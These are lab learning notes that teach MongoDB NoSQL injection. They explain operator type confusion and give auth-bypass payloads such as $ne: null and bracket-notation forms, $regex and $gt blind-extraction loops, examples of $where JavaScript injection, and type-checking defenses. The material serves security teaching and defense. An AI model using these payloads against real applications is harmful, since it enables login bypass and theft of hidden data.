# Learning notes: NoSQL injection (MongoDB)

> Read this before Phase 4, floors 1-2 (`records-room`, `archive-guardian`).
> It's a from-scratch primer: the mental model, the operators, the two
> core attack patterns, the defenses, and where each idea shows up in the
> lab. Grounded in MongoDB's own operator docs and the OWASP Testing Guide
> (see **References** at the end).

---

## 1. The one idea that makes NoSQL injection different

Classic SQL injection is a **syntax break**. The query is a *string*, your
input lands inside a quoted literal, and you escape the quote to turn data
into code:

```
   "SELECT * FROM users WHERE name = '"  +  input  +  "'"
                                             ^^^^^
                                    you break out of the quotes
```

MongoDB has no query string to break out of. A query is a **data
structure** (a dict/JSON object) from the moment it's built:

```python
db.users.find_one({"name": user_input})
#                  ^^^^^^^^^^^^^^^^^^^^^^
#              already a dict — nothing to "escape"
```

So the bug is not a syntax break. It is a **type confusion**:

```
  expected:  user_input is a STRING   ->  {"name": "gon"}        (equality)
  attacker:  user_input is a DICT     ->  {"name": {"$ne": null}} (an OPERATOR)
```

MongoDB looks at the *value*. If the value is a plain scalar, it's an
equality test. If the value is a dict whose keys start with `$`, MongoDB
honors those keys as **query operators**. The application never meant to
let you pick the operator — it only meant to let you pick the value — but
it never checked the *type* of what you sent.

> **The whole bug class in one sentence:** if an app folds a
> request-supplied value into a Mongo query without first checking it is
> the primitive type expected (usually `str`), a caller who makes that
> value arrive as a dict controls the query *operator*, not just the
> operand.

---

## 2. How does a dict "arrive" instead of a string?

Two delivery channels. Both appear in the lab.

### (a) JSON body — the natural one

If the endpoint accepts JSON, nesting is free. `json.loads` builds real
nested dicts for you:

```
POST /login              Content-Type: application/json

{"username": "admin", "password": {"$ne": null}}
                                   ^^^^^^^^^^^^^^
                     already a Python dict after json.loads
```

### (b) Bracket notation — for form/query-string endpoints

A query string or form body is *flat* key/value pairs — Werkzeug does
**not** auto-nest them. So apps sometimes reconstruct nesting from a
bracket convention (and the lab does exactly this to make GET requests
able to carry the same shape):

```
GET /records?value[$regex]=^SEIYAKU&value[$options]=i

   rebuilt by the app into:  {"value": {"$regex": "^SEIYAKU", "$options": "i"}}
```

> Not every app rebuilds bracket notation — but many frameworks and
> body-parsers (Express's `qs`, PHP, etc.) do it *by default*, which is
> why `param[$ne]=1` is a standard thing to try blind. The lab implements
> it on purpose so you can practice the GET form.

---

## 3. The operator toolbox

These are standard MongoDB query operators (not lab inventions). The ones
that matter for injection:

| Operator | Means | Attack use |
|---|---|---|
| `$ne` | not equal | `{"$ne": null}` → matches any doc where field exists → **auth bypass** |
| `$gt` / `$lt` | greater / less than | lexicographic **bisection** of a hidden value |
| `$gte`/`$lte` | ≥ / ≤ | boundary variants of the above |
| `$regex` | regex match | prefix-walk a hidden value **one character at a time** |
| `$exists` | field present? | discover which fields a document even has |
| `$in` | value in list | test many candidates in one query |
| `$where` | run **JavaScript** | arbitrary JS predicate — see §6 (not in lab) |
| `$or` | logical OR of clauses | inject extra clauses — see §6 (not in lab) |

---

## 4. Pattern A — Authentication bypass (lab floor p4_2)

The sink is a two-field equality login:

```python
db.agents.find_one({"username": username, "password": password})
```

Intended: both are strings, both must match a real credential. Attack:
make `password` (and/or `username`) an operator that is **true without
knowing the real value**:

```
{"username": {"$ne": null}, "password": {"$ne": null}}
```

`$ne: null` is "not equal to null" — true for *every* document that has
that field at all. The filter now matches every agent. `find_one` returns
the **first** document in natural order, and you're logged in as whoever
that is (in the lab, deliberately the privileged `guardian` account).

```
  normal login:      {"username":"field.rose","password":"th0rn_and_petal"}
                     └─ matches exactly one real agent (if pw correct)

  injected login:    {"username":{"$ne":null},"password":{"$ne":null}}
                     └─ matches ALL agents ──> find_one returns doc #1
```

Delivery, two equivalent ways:

```
JSON:   {"username":{"$ne":null},"password":{"$ne":null}}
form:   username[$ne]=1&password[$ne]=1
```

> Variants worth knowing: `{"$gt": ""}` (greater than empty string — true
> for any non-empty string), `{"$ne": "x"}`, `{"$exists": true}`. If
> `$ne: null` is filtered, these often still work.

---

## 5. Pattern B — Blind extraction (lab floor p4_1)

Here the endpoint is an **oracle**: it tells you only *match / no-match*,
never the data. You still extract a full hidden string, one bit at a time,
by asking yes/no questions with operators.

### Method 1: `$regex` prefix walk

Ask "does the value start with this prefix?" and grow the prefix:

```
value[$regex]=^S          -> match?   yes   (it starts with S)
value[$regex]=^SE         -> match?   yes
value[$regex]=^SEA        -> match?   no
value[$regex]=^SEI        -> match?   yes   ... keep going
```

Each confirmed character extends the known prefix. Anchor with `^`
(start), and remember regex metacharacters in the *target* (`{`, `}` in
`SEIYAKU{...}`) must be escaped in your pattern (`\{`).

```
   KNOWN: "SEIYAKU{"            try next char c in [a-z0-9_]
        │
        ▼
   ^SEIYAKU\{a   no
   ^SEIYAKU\{b   no
   ^SEIYAKU\{c   yes  ──►  KNOWN becomes "SEIYAKU{c"   ──► repeat
        ...
   stop when ^...\}$ matches (you've hit the closing brace)
```

### Method 2: `$gt` / `$lt` bisection (faster)

Binary-search the value lexicographically instead of linear-scanning the
alphabet:

```
value[$gt] = "SEIYAKU{m"   -> is the secret > that?   narrows the range
value[$gt] = "SEIYAKU{t"   ...
```

`log2(charset)` queries per character instead of `charset/2` on average.
Same oracle, fewer requests.

### The blind-extraction loop (both methods)

```
        ┌─────────────────────────────────────────┐
        │  known_prefix = ""                        │
        └───────────────┬───────────────────────────┘
                        ▼
        ┌─────────────────────────────────────────┐
        │  for each candidate next-char / boundary: │
        │     send query(known_prefix + guess)      │◄────┐
        │     read oracle: matched? (true/false)    │     │
        └───────────────┬───────────────────────────┘     │
                        ▼                                  │
        ┌─────────────────────────────────────────┐       │
        │  on a hit: known_prefix += that char      │───────┘
        │  on full value (closing anchor matches):  │
        │     DONE                                   │
        └─────────────────────────────────────────┘
```

> `field` is also unvalidated in p4_1, which lets you aim the oracle at
> *any* field on any document — including fields a normal search result
> never shows. Combine "which fields exist" (`$exists`) with the
> extraction loop to pull a value out of a field the UI never displays.

---

## 6. The gaps (what the lab does NOT drill — know they exist)

### `$where` — server-side JavaScript injection

If an app passes attacker input into a `$where` clause, you're no longer
limited to operators — you're injecting **JavaScript** that MongoDB runs
per-document:

```python
db.users.find({"$where": f"this.name == '{input}'"})   # VULN
#   input = "' || true || '"   ->  this.name == '' || true || ''  (all docs)
```

This is a *string* context again (JS inside a string), so it behaves more
like classic injection, and it can even give blind timing oracles via
`sleep()`. Modern MongoDB disables `$where`/JS by default
(`--noscripting`), but legacy deployments enable it. **Not in the lab**,
but it's the classic "intermediate" NoSQLi escalation.

### `$or` / logical-clause injection

Where an operator dict can carry `$or`, a caller can bolt on an
always-true clause:

```
{"filter": {"$or": [ {"realField": "x"}, {"1": {"$ne": 2}} ]}}
```

### Aggregation-pipeline injection

If request data reaches `$match`/`$lookup` stages of an aggregation, the
same type-confusion applies in a richer surface. Rare but high-impact.

---

## 7. Defense (the actual fix — same spirit as every phase)

The root cause is **unvalidated type**, so the fix is at the boundary:

1. **Type-check before the query.** Reject anything that isn't the
   expected primitive:
   ```python
   if not isinstance(value, str):
       abort(400)
   db.records.count_documents({field: value})
   ```
   This single check kills every operator-injection payload at once,
   because a dict can never reach the query.

2. **Validate `field` against an allow-list** too — never let the caller
   name an arbitrary field.

3. **Schema validation at the edge** (pydantic / JSON-schema / cerberus):
   declare "username is a string", and the framework rejects a nested
   object before your code ever sees it.

4. **Disable server-side JS** (`$where`, `mapReduce`) unless genuinely
   needed — `--noscripting` / `security.javascriptEnabled: false`.

5. **Least privilege** on the DB user, as always: a read-only app role
   can't be turned into a write/drop even after a successful read
   injection.

> Note what is *not* the fix: "escaping." There's no quote to escape.
> Sanitizing `$` out of strings is a brittle band-aid; the correct fix is
> enforcing the *type*.

---

## 8. Map to the lab

| Floor | Route | Sink | What you practice |
|---|---|---|---|
| p4_1 Records Room | `GET/POST /p4/records` | `count_documents({field: value})` | blind extraction (`$regex`, `$gt`, `$exists`), both delivery channels |
| p4_2 Archive Guardian | `POST /p4/guardian` | `find_one({"username":…,"password":…})` | auth bypass (`$ne: null`), land on the privileged doc |

Both sinks are *identical in shape* to the code in §1 — a dict built from
unchecked request values. Read `challenges/phase4.py` (whitebox is
allowed) and find the `# VULN` comment on each; then the `DEBRIEF.md` in
each floor's directory walks the exact payloads.

---

## 9. References (official / primary)

- **MongoDB query operators** — https://www.mongodb.com/docs/manual/reference/operator/query/
  (`$ne`, `$gt`, `$regex`, `$exists`, `$where`, …)
- **MongoDB `$where`** — https://www.mongodb.com/docs/manual/reference/operator/query/where/
- **OWASP Testing Guide — Testing for NoSQL Injection** (WSTG-INPV-05) —
  https://owasp.org/www-project-web-security-testing-guide/
- **OWASP Cheat Sheet — Injection Prevention / Input Validation** —
  https://cheatsheetseries.owasp.org/
- **PyMongo type behavior** — https://pymongo.readthedocs.io/
